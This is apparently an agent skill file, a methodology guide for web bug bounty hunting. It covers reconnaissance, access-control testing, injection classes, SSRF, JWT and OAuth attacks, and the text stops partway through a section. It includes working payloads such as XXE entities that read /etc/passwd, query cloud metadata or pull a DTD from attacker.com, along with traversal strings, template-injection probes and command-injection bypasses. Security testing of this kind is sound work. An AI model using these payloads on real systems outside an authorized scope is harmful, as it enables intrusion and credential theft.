---
name: bugbounty
description: "Bug bounty hunting — full attack surface analysis, vulnerability discovery, exploitation methodology, and reporting. Covers recon, web, API, auth, business logic, chaining, cloud attacks, and structured proof-of-concept development."
---

# Bug Bounty Skill — Complete Agent Intelligence

## 0. Core Philosophy

Before any technical instruction: **understand the application's business model, security architecture, and trust boundaries before attempting exploitation.** The strongest bug bounty findings come from understanding *what the application should enforce* and then proving it does not.

Every endpoint, parameter, and behavior exists for a reason. Your job is to find where implementation diverges from intent.

---

## 1. Reconnaissance — Continuous Attack-Surface Expansion

Do not treat reconnaissance as a phase that ends. Every discovery expands the attack surface.

### 1.1 Subdomain Enumeration

Enumerate and prioritize:

- `dev.*`, `staging.*`, `test.*`, `beta.*`, `alpha.*`
- `api.*`, `api-v1.*`, `api-v2.*`, `legacy.*`
- `admin.*`, `portal.*`, `dashboard.*`
- `mail.*`, `smtp.*`, `imap.*`
- `cdn.*`, `static.*`, `assets.*`
- `internal.*`, `corp.*`, `intranet.*`
- `sso.*`, `auth.*`, `login.*`
- `docs.*`, `wiki.*`, `kb.*`
- `status.*`, `monitoring.*`, `grafana.*`
- `jira.*`, `gitlab.*`, `github.*`, `confluence.*`

Tools: subfinder, amass, DNSx, httpx, VHost discovery.

### 1.2 Technology Fingerprinting

Identify on every discovered host:

- Web server and version
- Framework and version (Django, Rails, Express, Spring, Laravel, Next.js)
- CMS and plugins
- JavaScript frameworks (React, Vue, Angular, Svelte)
- CDN and proxy architecture (Cloudflare, Akamai, AWS CloudFront)
- Authentication mechanisms
- API patterns (REST, GraphQL, gRPC, WebSocket)
- Database technology (from error messages, stack traces)
- Cloud provider (AWS, GCP, Azure — from headers, metadata, errors)
- Container technology (Docker, Kubernetes)

### 1.3 JavaScript Analysis

Inspect all JavaScript for:

- Internal API endpoints (fetch, axios, XHR calls)
- Debug flags and development modes
- Client secrets and API keys
- Hidden functionality and feature flags
- Commented-out code
- Hardcoded credentials
- GraphQL schemas and mutations
- WebSocket endpoints
- OAuth client IDs and redirect URIs
- Admin functionality exposed in client code
- Source maps (check `/maps/` and `/sourcemaps/`)
- NPM packages with known vulnerabilities

### 1.4 HTTP Response Analysis

Inspect:

- Security headers (CSP, HSTS, X-Frame-Options)
- Server headers and version disclosure
- Cache behavior and cache-control directives
- CORS configuration
- Cookie attributes (HttpOnly, Secure, SameSite)
- Set-Cookie headers and session management
- Rate limit headers (X-RateLimit-*)
- API versioning in headers
- Debug/development headers

### 1.5 Directory and Endpoint Discovery

Force-browse common paths:

- `/admin`, `/admin/`, `/administrator`
- `/api/v1/`, `/api/v2/`, `/graphql`
- `/swagger`, `/docs`, `/api-docs`, `/openapi.json`
- `/.env`, `/.git/`, `/.git/config`
- `/backup`, `/db`, `/database`
- `/phpinfo.php`, `/server-status`
- `/robots.txt`, `/sitemap.xml`
- `/.well-known/`
- `/debug/`, `/trace/`, `/actuator/`
- `/config/`, `/settings/`
- `/internal/`, `/private/`
- `/test/`, `/testing/`, `/sandbox/`

---

## 2. Trust Boundary Analysis

For every endpoint, determine:

| Question | Why It Matters |
|---|---|
| Who is authenticated? | Authentication boundary |
| Who is authorized? | Authorization boundary |
| Which object does this operate on? | Object-level access control |
| Which fields are user-controlled? | Input trust boundary |
| Which values does the server trust? | Implicit trust assumptions |
| Does the server enforce the same restrictions as the frontend? | Client-side vs server-side enforcement |
| Can one user's request affect another user's data? | Cross-user impact |
| Can unprivileged users invoke privileged functionality? | Privilege escalation |
| Can a request be replayed, reordered, duplicated, or modified? | State manipulation |
| Does the server validate business invariants? | Business logic integrity |

---

## 3. IDOR / BOLA / Access Control

The most common high-severity finding. Test authorization, not just functionality.

### 3.1 Target Identifiers

- User IDs, account IDs, profile IDs
- Order IDs, invoice IDs, transaction IDs
- File IDs, document IDs, attachment IDs
- Group IDs, organization IDs, team IDs
- API keys, tokens, session IDs
- Numeric path parameters, UUIDs
- Object references in request bodies
- Query parameters with identifiers

### 3.2 Testing Methodology

1. Establish baseline with authorized account
2. Change only the identifier
3. Test neighboring values (ID±1)
4. Test UUIDs from other users
5. Test with a completely separate account
6. Test different HTTP methods (GET, POST, PUT, DELETE)
7. Test API version differences
8. Test direct endpoint access vs. frontend-routed access

### 3.3 Common IDOR Patterns

```
GET /api/users/{victim_id}/profile
GET /api/orders/{victim_order_id}
GET /api/files/download?file_id={victim_file_id}
POST /api/messages { "recipient_id": {victim_id} }
PUT /api/users/{victim_id}/settings
DELETE /api/documents/{victim_doc_id}
```

### 3.4 Advanced IDOR

- Test indirect object references (usernames, email addresses in URLs)
- Test GraphQL queries with different user IDs
- Test batch operations for cross-user data leakage
- Test file download with path manipulation
- Test API endpoints that accept both ID and UUID
- Test export/download functionality for cross-user data

---

## 4. Authentication and Authorization

### 4.1 Authentication Testing

**Login bypass:**
- SQL injection in login fields
- NoSQL injection in login fields
- Parameter manipulation (role, isAdmin)
- Default credentials
- Account enumeration via timing, error messages, response differences

**Password policy bypass:**
- Client-side only enforcement
- API accepts weak passwords
- Password complexity not enforced on all paths

**Session management:**
- Session fixation
- Session token predictability
- Session invalidation on logout
- Concurrent session handling
- Session token in URL
- Session token in referer header

### 4.2 Authorization Testing

Test independently from authentication:

- normal user → privileged endpoint
- user A → user B's objects
- unauthenticated → authenticated functionality
- lower privilege → higher privilege functionality
- HTTP method changes (GET → POST → PUT → PATCH)
- alternate API versions
- direct endpoint access bypassing frontend
- hidden frontend functionality
- authorization checks only on client-side
- authorization checks on write but not read
- authorization checks on primary endpoint but not secondary

### 4.3 2FA/MFA Bypass

- Response manipulation (set 2FA status directly)
- Brute-force 4/6-digit codes
- OTP prediction or timing analysis
- Backup code reuse
- Disable 2FA via API without re-authentication
- 2FA setup bypass (complete registration without 2FA)
- Session reuse after password change without 2FA
- OAuth/SSO bypass of 2FA
- API endpoint that skips 2FA check
- Race condition on 2FA verification
- 2FA code sent via insecure channel (HTTP, email without TLS)

### 4.4 Password Reset Flaws

- Host header injection in reset email
- Reset token predictability
- Reset token not invalidated after use
- Reset token in URL (leaked via Referer)
- Account enumeration via reset flow
- Reset flow for one user affects another
- Timing-based enumeration
- Password reset via API without email verification
- Reset link sent over HTTP
- Reset token valid for too long
- Reset token guessable (sequential, short)

### 4.5 Account Recovery Bypass

- Security question bypass via response manipulation
- Recovery code reuse
- Recovery flow skips verification steps
- Account recovery affects wrong account
- Recovery via alternative email without verification

---

## 5. Mass Assignment

For object-update endpoints, identify fields the frontend does not expose.

### 5.1 Target Fields

- `role`, `isAdmin`, `isSuperAdmin`
- `verified`, `emailVerified`, `phoneVerified`
- `accountStatus`, `status`, `active`
- `balance`, `credits`, `points`
- `subscription`, `plan`, `tier`
- `createdAt`, `updatedAt`
- `createdBy`, `ownerId`
- `permissions`, `accessLevel`
- `internalId`, `staffNotes`

### 5.2 Testing Methodology

1. Intercept a legitimate update request
2. Add suspicious fields to the request body
3. Send via API (not just UI)
4. Verify if the field was accepted and persisted
5. Check both create and update endpoints
6. Test with different user roles

### 5.3 GraphQL Mass Assignment

- Modify mutation input to include privileged fields
- Test nested object mutations
- Test fragment spreads for hidden fields
- Test batch mutations for field injection

---

## 6. XSS (Cross-Site Scripting)

### 6.1 Contexts to Test

- HTML body
- HTML attributes
- JavaScript strings
- JavaScript event handlers
- CSS values
- URL parameters (href, src, action)
- HTTP headers (if reflected)
- Error messages
- File upload names
- Markdown/BBCode rendering
- PDF generation
- Email content
- Template engines (Jinja2, Handlebars, Mustache)
- Client-side routing (SPA URL paths)
- WebSocket messages displayed in UI
- JSON responses embedded in HTML

### 6.2 Testing Methodology

1. Establish reflection (does input appear in response?)
2. Determine context (HTML, attribute, JS, URL)
3. Identify encoding (HTML entities, JS escaping, URL encoding)
4. Bypass context-specific filters
5. Craft payload for context
6. Verify execution (alert, confirm, prompt, document.cookie)
7. Determine impact (session theft, defacement, phishing)

### 6.3 Advanced XSS

- Mutation XSS (mXSS) via HTML parser differences
- XSS via SVG/MathML
- XSS via file upload (HTML, SVG files)
- XSS via PDF generation
- XSS via Markdown rendering
- XSS via template injection
- XSS via JavaScript URL scheme
- XSS via CSS injection
- XSS via HTTP headers (if reflected in error pages)
- DOM XSS via client-side routing
- XSS via WebSocket messages
- Stored XSS in file metadata
- XSS in email templates
- XSS via CORS misconfiguration
- XSS via subdomain takeover

---

## 7. SQL Injection

### 7.1 Parameters to Test

- `id`, `user_id`, `order_id`
- `search`, `query`, `q`
- `filter`, `category`, `sort`
- `page`, `offset`, `limit`
- Login fields (username, password)
- Registration fields
- Profile update fields
- File upload names
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookie values
- JSON request body fields
- XML request body elements

### 7.2 Testing Methodology

1. Establish baseline response
2. Inject single quote, double quote, backtick
3. Observe database errors, response differences, timing
4. Use UNION-based extraction if errors appear
5. Use blind injection (boolean-based, time-based)
6. Extract data if possible
7. Determine database type and version
8. Escalate to file read/write, command execution if possible

### 7.3 Advanced SQLi

- Second-order SQL injection (stored in DB, triggered later)
- SQL injection via XML/JSON parameters
- SQL injection in ORDER BY / GROUP BY
- SQL injection in LIMIT / OFFSET
- Blind injection via conditional responses
- Time-based injection with high precision
- Out-of-band data exfiltration
- SQL injection in stored procedures
- NoSQL injection (MongoDB operators, CouchDB)
- SQL injection via HTTP headers
- SQL injection in CSV export functionality

### 7.4 NoSQL Injection

- MongoDB operator injection (`$gt`, `$ne`, `$regex`)
- `$where` clause injection
- Array injection
- JSON injection in query parameters
- Operator precedence manipulation
- Authentication bypass via NoSQL injection

---

## 8. SSRF (Server-Side Request Forgery)

### 8.1 Target Endpoints

- URL preview / unfurling
- Webhook configuration
- Import / export functionality
- Image/document processing
- PDF generation from URL
- RSS feed aggregation
- Link shortener / redirector
- Payment callback URLs
- OAuth callback URLs
- Integration configuration
- Health check endpoints
- API proxy endpoints

### 8.2 Internal Service Discovery

- `http://localhost`, `http://127.0.0.1`, `http://[::1]`
- `http://0.0.0.0`
- `http://internal-service-name` (Docker/K8s)
- `http://169.254.169.254` (AWS metadata)
- `http://metadata.google.internal` (GCP metadata)
- `http://169.254.169.254/metadata/v1/` (Azure metadata)
- `http://host.docker.internal`
- `http://172.17.0.1` (Docker bridge)
- Internal admin panels
- Internal databases (Redis, MongoDB, PostgreSQL)
- Internal message queues (RabbitMQ, Kafka)
- Internal monitoring (Prometheus, Grafana)

### 8.3 Bypass Techniques

- IP address encoding (decimal, octal, hex, IPv6)
- DNS rebinding
- Redirect-based bypass (redirect to internal URL)
- URL parser differential
- DNS resolution timing
- Protocol smuggling (gopher://, file://, dict://)
- URL fragment bypass
- Double URL encoding
- Backslash bypass
- Newline injection in URL
- DNS alias / CNAME records

### 8.4 Impact Escalation

- Read cloud metadata → extract credentials
- Access internal admin panels → privilege escalation
- Read internal files → source code disclosure
- Interact with internal APIs → data exfiltration
- Port scan internal network → service discovery

---

## 9. File Handling

### 9.1 Upload Testing

Test the complete validation chain:

1. **Client-side:** extension, MIME type, size
2. **Server-side:** extension whitelist/blacklist, MIME type, magic bytes, content inspection
3. **Storage:** path, permissions, naming convention
4. **Retrieval:** direct URL, access control, content-type
5. **Processing:** image processing, document conversion, virus scanning

### 9.2 Upload Attack Vectors

- Extension bypass (`.php5`, `.phtml`, `.pht`, `.phar`, `.shtml`)
- Double extension (`.php.jpg`)
- Null byte injection (`shell.php%00.jpg`)
- MIME type manipulation
- Magic bytes manipulation
- Path traversal in filename (`../../../etc/passwd`)
- Symlink attacks
- Polyglot files (valid image + executable)
- SVG with embedded JavaScript
- PDF with embedded JavaScript
- ZIP slip (path traversal in archive extraction)

### 9.3 Path Traversal

- `/etc/passwd`, `/etc/shadow`
- `..\..\..\..\windows\system32\config\sam`
- Null byte injection
- URL encoding traversal
- Double URL encoding
- Unicode normalization
- UTF-8 overlong encoding
- Backslash vs forward slash
- Path truncation

---

## 10. XXE (XML External Entity)

### 10.1 Entry Points

- SOAP endpoints
- XML-RPC
- RSS/Atom feed parsing
- Document upload (DOCX, XLSX, SVG)
- PDF generation from XML
- SAML assertions
- Configuration file parsing
- Import/export functionality

### 10.2 XXE Payloads

```xml
<!-- File read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Blind XXE -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>

<!-- Error-based XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<data>&xxe;</data>
```

### 10.3 XXE in Modern Applications

- JSON-to-XML conversion endpoints
- Office document processing (DOCX, XLSX, PPTX)
- SVG image processing
- SAML authentication
- SOAP web services
- PDF generation libraries
- CSV import with XML processing

---

## 11. JWT Security

### 11.1 JWT Analysis

1. Decode all three parts (header, payload, signature)
2. Examine claims: `sub`, `iss`, `exp`, `iat`, `role`, `user_id`, `is_admin`
3. Check algorithm in header (`alg`: HS256, RS256, none)
4. Check if `alg` is configurable by client
5. Test signature verification

### 11.2 JWT Attack Vectors

- **Algorithm confusion:** RS256 → HS256 with public key as secret
- **None algorithm:** Remove signature, set `alg: none`
- **Key brute-force:** Weak HMAC secret
- **Claim manipulation:** Modify `role`, `user_id`, `is_admin`
- **Token replay:** Expired token reuse
- **Token theft:** Insecure storage, logging, referer
- **Key leakage:** Public key used as HMAC secret
- **JWK confusion:** Inject attacker's key
- **JKU injection:** Manipulate key set URL
- **Token injection:** Embed token in other contexts

---

## 12. OAuth Security

### 12.1 OAuth Flow Testing

- **redirect_uri validation:** Open redirect, subdomain match, exact match
- **state parameter:** CSRF protection, predictability, validation
- **client_id exposure:** Public client, implicit flow
- **scope manipulation:** Request elevated scopes
- **authorization code theft:** Interception, replay
- **token leakage:** URL fragment, referer header, logs

### 12.2 Advanced OAuth Attacks

- **Login CSRF:** Force victim to link attacker's account
- **Account takeover:** Link attacker's OAuth to victim's account
- **Token theft via XSS:** Access token in storage
- **Redirect_uri bypass:** Open redirect in subdomain
- **PKCE bypass:** Missing or weak code verifier
- **Token replay:** Refresh token theft and reuse
- **Scope escalation:** Request admin scopes

---

## 13. CORS (Cross-Origin Resource Sharing)

### 13.1 Testing Methodology

1. Send request with controlled origin
2. Check `Access-Control-Allow-Origin` response header
3. Check `Access-Control-Allow-Credentials`
4. Check which sensitive endpoints return data
5. Verify if browser-based cross-origin read is possible

### 13.2 CORS Misconfigurations

- **Reflect origin:** `Origin: https://attacker.com` → `ACAO: https://attacker.com`
- **Null origin:** `Origin: null` → `ACAO: null`
- **Wildcard:** `ACAO: *` with credentials
- **Subdomain match:** `*.target.com` allows attacker subdomains
- **Prefix match:** `https://target.com.attacker.com`
- **Suffix match:** `https://attacker-target.com`
- **HTTP allowed:** Downgrade to HTTP
- **Extra headers:** `Access-Control-Allow-Headers: Authorization`

---

## 14. Host Header Injection / CRLF

### 14.1 Host Header Testing

- Password reset links with attacker-controlled host
- Generated URLs in email content
- Redirect destinations
- Cache key manipulation
- Virtual host routing

### 14.2 CRLF Injection

- Response header injection
- HTTP response splitting
- Log injection
- XSS via header injection
- Cache poisoning via header injection

---

## 15. HTTP Parameter Pollution (HPP)

Test duplicate parameters:

```
?id=1&id=2
?id=1&id=2&id=3
?role=user&role=admin
```

Investigate:

- Framework parameter parsing behavior
- Proxy behavior (nginx, Apache, HAProxy)
- Backend parameter parsing
- Authorization bypass via parameter confusion
- Validation bypass

---

## 16. Prototype Pollution

When JSON/object structures are accepted:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

Test:

- `__proto__`, `constructor.prototype`
- Deep merge functions
- Object.assign
- JSON.parse with property injection
- Template literal injection
- Client-side prototype pollution → XSS

---

## 17. Race Conditions

### 17.1 Target Operations

- Coupon redemption
- Payments and transfers
- Balance operations
- Points/rewards accumulation
- Vote/like operations
- One-time actions (redemption, verification)
- Token generation
- Rate limit bypass

### 17.2 Testing Methodology

1. Identify state-changing operations
2. Send concurrent requests
3. Monitor for duplicate processing
4. Check for TOCTOU vulnerabilities
5. Verify business invariants

### 17.3 Race Condition Types

- **Classic race:** Check-then-act
- **TOCTOU:** Time of check to time of use
- **Double spending:** Multiple concurrent uses of single-use resource
- **Balance manipulation:** Concurrent balance modifications
- **Reward duplication:** Multiple redemptions of single-use rewards

---

## 18. Business Logic

### 18.1 Testing Methodology

Understand the application's intended behavior, then test whether users can:

- Skip required workflow steps
- Repeat one-time actions
- Modify quantities/prices unexpectedly
- Manipulate discounts or coupons
- Claim rewards repeatedly
- Transfer benefits to unintended accounts
- Perform actions before verification
- Violate transaction/order assumptions
- Access features outside subscription tier
- Manipulate pricing calculations

### 18.2 Common Business Logic Flaws

- **Discount abuse:** Stack discounts, use multiple coupons
- **Price manipulation:** Modify price in transit
- **Quantity manipulation:** Negative quantities, zero quantities
- **Subscription bypass:** Access premium features without payment
- **Referral abuse:** Self-referral, fake referrals
- **Trial abuse:** Multiple trial accounts
- **Coupon abuse:** Reuse single-use coupons
- **Balance manipulation:** Add funds without payment
- **Order manipulation:** Modify order after placement
- **Payment bypass:** Skip payment step in checkout

---

## 19. Account Enumeration

### 19.1 Enumeration Vectors

- Login error messages ("Invalid password" vs "Account not found")
- Password reset timing
- Registration timing
- Username availability checks
- API response differences
- HTTP status code differences
- Response length differences
- Timing analysis

### 19.2 Testing Methodology

1. Collect baseline responses for known-valid and known-invalid accounts
2. Compare: status codes, response lengths, timing, headers, error messages
3. Use multiple observations
4. Test across multiple endpoints

---

## 20. Cache Security

### 20.1 Cache Poisoning

- User-controlled headers affecting cache key
- Host header manipulation
- URL path manipulation
- Vary header issues
- Cache key normalization

### 20.2 Cache Deception

- URL path manipulation to cache sensitive responses
- File extension confusion
- Cache key manipulation

### 20.3 Sensitive Data Caching

- Authenticated pages cached without no-store
- Personal data in shared caches
- API responses cached with user data

---

## 21. WebSocket Security

### 21.1 Testing Methodology

1. Intercept WebSocket upgrade request
2. Inspect authentication mechanism
3. Test authorization at message level
4. Test for cross-user data access
5. Test for injection via WebSocket messages

### 21.2 WebSocket Attacks

- Authorization bypass on message level
- Cross-user subscription
- Command injection via WebSocket messages
- Denial of service
- Message manipulation
- Session fixation via WebSocket

---

## 22. Rate Limiting

### 22.1 Testing Methodology

1. Identify rate-limited endpoints
2. Determine rate limit keying mechanism
3. Test bypass techniques

### 22.2 Rate Limit Bypass

- IP rotation
- Header manipulation (X-Forwarded-For, X-Real-IP)
- Session rotation
- Account rotation
- API key rotation
- Parallel request distribution
- Protocol downgrade
- Path variation
- Parameter variation

---

## 23. Information Disclosure

### 23.1 Data Sources

- API responses (verbose error messages)
- Source code (JavaScript, source maps)
- HTTP headers (Server, X-Powered-By)
- Error pages (stack traces, database errors)
- Debug endpoints (/debug, /trace, /actuator)
- Logs (if accessible)
- Backup files
- Version control (.git, .svn)
- Configuration files (.env, config.json)

### 23.2 Sensitive Data Types

- Email addresses, phone numbers
- API keys, tokens, secrets
- Internal hostnames, IP addresses
- File system paths
- Database connection strings
- Stack traces
- Debug output
- User PII

---

## 24. Open Redirect

### 24.1 Testing Methodology

1. Identify redirect parameters (`url`, `redirect`, `next`, `return_to`, `continue`)
2. Test external URL redirection
3. Test protocol-relative URLs (`//attacker.com`)
4. Test URL encoding bypass
5. Test path traversal bypass
6. Test double URL encoding
7. Test backslash bypass
8. Test newline injection

### 24.2 Impact Escalation

- Phishing via trusted domain
- OAuth token theft via redirect
- Credential theft via redirect chain
- CSRF via redirect
- Filter bypass via redirect

---

## 25. Subdomain Takeover

### 25.1 Detection

1. Identify dangling CNAME records
2. Check for services that can be claimed
3. Verify takeover feasibility

### 25.2 Common Takeover Targets

- Expired Heroku apps
- Expired GitHub Pages
- Expired AWS S3 buckets
- Expired Azure websites
- Expired DigitalOcean apps
- Unclaimed Fastly services
- Unclaimed Cloudflare services
- Unclaimed Shopify stores
- Unclaimed Surge.sh apps
- Unclaimed WordPress.com sites

---

## 26. GraphQL Attacks

### 26.1 Reconnaissance

- Introspection query to discover schema
- Query depth and complexity analysis
- Field enumeration
- Type discovery
- Mutation analysis
- Subscription endpoints

### 26.2 Attack Vectors

- **Introspection abuse:** Full schema disclosure
- **Authorization bypass:** Query as different user
- **Batch attacks:** Bypass rate limiting
- **Depth attacks:** Nested queries for data extraction
- **Alias attacks:** Bypass query depth limits
- **Field suggestion attacks:** Information disclosure
- **Batch mutation:** Mass assignment via mutations
- **Subscription hijacking:** Cross-user data access
- **Query complexity:** DoS via expensive queries

### 26.3 GraphQL-Specific Techniques

```graphql
# Introspection
{ __schema { types { name fields { name type { name } } } } }

# Authorization bypass
{ user(id: "OTHER_USER_ID") { email role } }

# Batch attack
query { user1: user(id: "1") { email } user2: user(id: "2") { email } }

# Deep nesting
{ user { friends { friends { friends { email } } } } }
```

---

## 27. Command Injection

### 27.1 Entry Points

- File upload processing
- Document conversion
- Image processing
- PDF generation
- Spreadsheet processing
- DNS lookup
- Ping/connectivity checks
- Webhook callbacks
- CSV/data import processing

### 27.2 Testing Methodology

1. Identify command execution points
2. Test with benign commands (`id`, `whoami`)
3. Verify output in response
4. Determine command context (Linux vs Windows)
5. Test filter bypass

### 27.3 Bypass Techniques

- Space alternatives (`$IFS`, `{cmd,arg}`)
- Pipe and semicolon (`|`, `;`, `&&`, `||`)
- Newline injection
- Backtick execution
- `$()` execution
- Wildcard expansion
- Variable expansion
- Filter bypass (`c\at`, `ca''t`)
- Encoding bypass (base64, hex)

---

## 28. Template Injection (SSTI)

### 28.1 Detection

```
{{7*7}} → 49
${7*7} → 49
<%= 7*7 %> → 49
#{7*7} → 49
```

### 28.2 Template Engines

- Jinja2 (Python): `{{ config }}`, `{{ ''.__class__.__mro__ }}`
- Twig (PHP): `{{ _self.env.registerUndefinedFilterCallback }}`
- Handlebars (Node): `{{#with "s" as |string|}}{{#with "e"}}...{{/with}}{{/with}}`
- Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>`
- Velocity (Java): `#set($class=...)`

### 28.3 Impact

- Remote code execution
- File read/write
- Information disclosure
- Server-side request forgery
- Denial of service

---

## 29. LDAP Injection

### 29.1 Testing Methodology

1. Identify LDAP query construction
2. Inject LDAP metacharacters (`*`, `(`, `)`, `\`, `null`)
3. Bypass authentication
4. Extract directory information

### 29.2 Attack Vectors

- Authentication bypass
- Information disclosure
- Directory enumeration
- Privilege escalation

---

## 30. Deserialization Attacks

### 30.1 Language-Specific

- **Java:** ObjectInputStream, readObject(), gadgets
- **PHP:** unserialize(), magic methods
- **Python:** pickle, yaml.load()
- **Ruby:** Marshal.load()
- **.NET:** BinaryFormatter, ObjectStateFormatter
- **Node.js:** node-serialize

### 30.2 Testing Methodology

1. Identify deserialization points
2. Determine serialization format
3. Craft serialized payload
4. Test for remote code execution
5. Test for SQL injection
6. Test for SSRF

---

## 31. Email Header Injection

### 31.1 Testing Methodology

1. Identify email-sending functionality
2. Inject newlines in email headers
3. Test for additional header injection
4. Test for SMTP command injection

### 31.2 Attack Vectors

- Add additional email recipients
- Modify email subject
- Inject mail headers (Reply-To, From)
- SMTP command injection

---

## 32. API Security Testing

### 32.1 REST API

- Authentication mechanism (API key, OAuth, JWT)
- Authorization per endpoint
- Rate limiting
- Input validation
- Error handling
- Content-type enforcement
- Parameter handling
- Batch operations

### 32.2 API Versioning Attacks

- Test old API versions for deprecated vulnerabilities
- Test API version parameter manipulation
- Test API version bypass

### 32.3 API-Specific Tests

- BOLA/IDOR per endpoint
- Mass assignment per mutation
- Rate limiting per endpoint
- Input validation per parameter
- Error message verbosity
- HTTP method override
- Content-type manipulation
- Batch operation abuse

---

## 33. Advanced Reconnaissance — Elite Hunting Techniques

**The difference between average and elite hunters is recon depth.** Average hunters scan and hope. Elite hunters build a complete model of the application, then find where implementation diverges from intent.

---

### 33.1 UNAUTHENTICATED RECONNAISSANCE (No Account Required)

#### A. Passive DNS & Infrastructure Intelligence

**Certificate Transparency Monitoring:**
- Query crt.sh for all certificates issued to target domains
- Extract subdomains from certificate SANs
- Identify wildcard certificates and their scope
- Monitor for new certificate issuance (early warning of new services)

**DNS Intelligence:**
- Full DNS record enumeration (A, AAAA, MX, NS, TXT, CNAME, SOA, SRV, CAA)
- Check for email security records (SPF, DMARC, DKIM)
- Identify mail servers and their configurations
- Check for DNS-based authentication (DANE, TLSA)
- Reverse DNS lookups on discovered IP ranges
- IP range ownership analysis (BGP/ASN data)
- Passive DNS history for expired/deleted subdomains

**Infrastructure Fingerprinting:**
- Identify hosting providers and cloud infrastructure
- Map CDN and proxy architecture
- Identify WAF and security products
- Detect load balancers and their configurations
- Identify container orchestration platforms
- Map CI/CD pipeline indicators

**WHOIS & Registration Intelligence:**
- Historical WHOIS data
- Registrar information
- Creation/expiry dates
- Nameserver changes over time
- Associated domains through registration patterns

#### B. Source Code & Configuration Exposure

**Version Control Discovery:**
- `.git` directory exposure (use git-dumper to extract)
- `.svn` working copies
- `.hg` repositories
- `.bzr` repositories
- Backup files (`.bak`, `.old`, `.orig`, `.save`, `.swp`)
- Temporary files (`~`, `.tmp`, `.temp`)
- Editor artifacts (`.vscode`, `.idea`, `.project`)

**Configuration File Discovery:**
- `.env` files (environment variables, secrets)
- `config.json`, `config.yml`, `config.yaml`
- `settings.py`, `settings.js`
- `wp-config.php`, `.htaccess`
- `web.config`, `appsettings.json`
- `docker-compose.yml`, `Dockerfile`
- `terraform.tfstate`, `terraform.tfvars`
- `Jenkinsfile`, `.gitlab-ci.yml`
- `serverless.yml`, `template.yaml`

**Debug & Development Endpoints:**
- `/debug/vars`, `/debug/pprof/`
- `/actuator`, `/actuator/env`, `/actuator/health`
- `/phpinfo.php`, `/info.php`, `/test.php`
- `/server-status`, `/server-info`
- `/__developer__`, `/_debug`
- `/graphql` (introspection enabled)
- `/swagger-ui.html`, `/api-docs`, `/openapi.json`

#### C. JavaScript Deep Analysis

**Script Discovery:**
- Parse all HTML pages for `<script>` tags
- Check for dynamically loaded scripts
- Analyze service workers
- Check for Web Workers
- Analyze webpack chunks and bundles
- Check for source maps (`/maps/`, `/sourcemaps/`)
- Analyze lazy-loaded modules

**API Endpoint Extraction:**
- Parse JavaScript for `fetch()`, `axios.get()`, `axios.post()`
- Extract XHR endpoint patterns
- Identify GraphQL queries and mutations
- Find WebSocket connection URLs
- Extract API base URLs and version patterns
- Identify hidden admin endpoints
- Find internal API documentation endpoints

**Secret & Credential Discovery:**
- API keys and tokens (regex patterns)
- AWS access keys (`AKIA...`)
- Google API keys (`AIza...`)
- Stripe keys (`sk_live_...`, `pk_live_...`)
- GitHub tokens (`ghp_...`, `gho_...`)
- Hardcoded credentials
- OAuth client secrets
- JWT secrets
- Encryption keys

**Feature Flag Analysis:**
- Identify feature flag systems (LaunchDarkly, Split.io, custom)
- Extract flag names and default values
- Test for flag manipulation via API
- Check for admin-only flags
- Identify A/B testing configurations

#### D. API & Endpoint Discovery

**GraphQL Reconnaissance:**
- Introspection query: `{ __schema { types { name fields { name } } } }`
- Query depth analysis
- Mutation enumeration
- Subscription discovery
- Type hierarchy mapping
- Error message analysis

**REST API Discovery:**
- Check `/api-docs`, `/swagger.json`, `/openapi.json`
- Analyze Swagger/OpenAPI specifications
- Check for versioned APIs (`/api/v1/`, `/api/v2/`)
- Identify deprecated endpoints
- Check for internal APIs exposed publicly

**WebSocket Discovery:**
- Identify WebSocket upgrade endpoints
- Analyze WebSocket authentication mechanisms
- Check for unauthenticated WebSocket access
- Test message-level authorization

#### E. Technology-Specific Reconnaissance

**WordPress:**
- `/wp-json/wp/v2/users` (user enumeration)
- `/wp-login.php` (admin access)
- `/xmlrpc.php` (API access)
- `/wp-admin/` (admin panel)
- Plugin and theme enumeration
- Version detection from generator tags

**Laravel:**
- `/telescope` (debugging tool)
- `/horizon` (queue management)
- `/ignition` (error handling)
- `.env` file exposure
- Debug mode detection

**Django:**
- `/admin/` (admin panel)
- `/static/admin/` (admin static files)
- Debug toolbar detection
- Settings file exposure

**Spring:**
- `/actuator` (management endpoints)
- `/actuator/env` (environment variables)
- `/actuator/configprops` (configuration properties)
- `/h2-console` (database console)
- `/swagger-ui.html` (API documentation)

**Node.js/Express:**
- `/debug/vars` (debug endpoints)
- Stack trace analysis
- Package.json exposure
- Node_modules exposure

---

### 33.2 AUTHENTICATED RECONNAISSANCE (With Account)

**Why authenticated recon is critical:** Many attack surfaces are only visible after authentication. Elite hunters spend significant time mapping the authenticated experience.

#### A. Complete Feature Mapping

**Navigation Analysis:**
- Map every menu item and navigation path
- Identify all user-facing features
- Document every form and input field
- Track all URL patterns and routing
- Identify all modal dialogs and popups
- Map all dropdown menus and their options

**Functionality Inventory:**
- Profile management (view, edit, delete)
- Account settings (email, password, 2FA)
- Notification preferences
- Privacy settings
- Data export/import
- Integration settings
- API key management
- Webhook configuration
- Team/organization management
- Billing and subscription
- Admin panel (if accessible)

#### B. API Traffic Analysis

**Request/Response Logging:**
- Log all API calls made by the frontend
- Document request methods, paths, headers, and bodies
- Record response codes, headers, and bodies
- Identify authentication mechanisms per endpoint
- Track session/token management
- Document rate limiting headers

**Endpoint Enumeration:**
- Test every CRUD operation for each resource
- Identify batch operations
- Test pagination parameters
- Identify filtering and sorting options
- Test export/import functionality
- Check for admin-only endpoints

**Parameter Analysis:**
- Document all request parameters
- Identify required vs optional parameters
- Test parameter validation
- Check for mass assignment opportunities
- Identify hidden or undocumented parameters
- Test parameter types (string, integer, array, object)

#### C. Access Control Mapping

**Role-Based Testing:**
- Test with different user roles (if available)
- Map permissions per role
- Identify privilege escalation paths
- Test role modification via API
- Check for role-based access control bypass

**Object-Level Access Control:**
- Create test objects (users, orders, documents)
- Test access from different accounts
